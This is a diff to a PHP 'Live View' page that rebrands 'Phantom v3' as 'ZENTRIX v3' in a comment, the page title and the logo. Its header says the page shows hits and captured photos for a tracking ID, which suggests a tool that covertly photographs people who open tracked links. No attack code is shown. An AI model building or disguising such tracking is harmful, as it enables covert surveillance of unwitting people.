@@ -1,6 +1,6 @@
 <?php
 /**
- * Phantom v3 – Live View
+ * ZENTRIX v3 – Live View
  * Shows hits + captured photos for a specific tracking ID
  */
 
@@ -37,7 +37,7 @@ if (is_dir($photoDir)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Live – <?= htmlspecialchars($id) ?></title>
+    <title>ZENTRIX Live – <?= htmlspecialchars($id) ?></title>
     <link rel="stylesheet" href="assets/css/style.css">
     <script src="assets/js/theme.js"></script>
     <style>
@@ -90,8 +90,8 @@ if (is_dir($photoDir)) {
 
     <header class="topbar">
         <div class="logo">
-            <span class="ghost">👻</span>
-            <span class="name">Phantom Live</span>
+            <span class="ghost">◈</span>
+            <span class="name">ZENTRIX Live</span>
         </div>
         <div style="display:flex; gap:12px; align-items:center;">
             <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
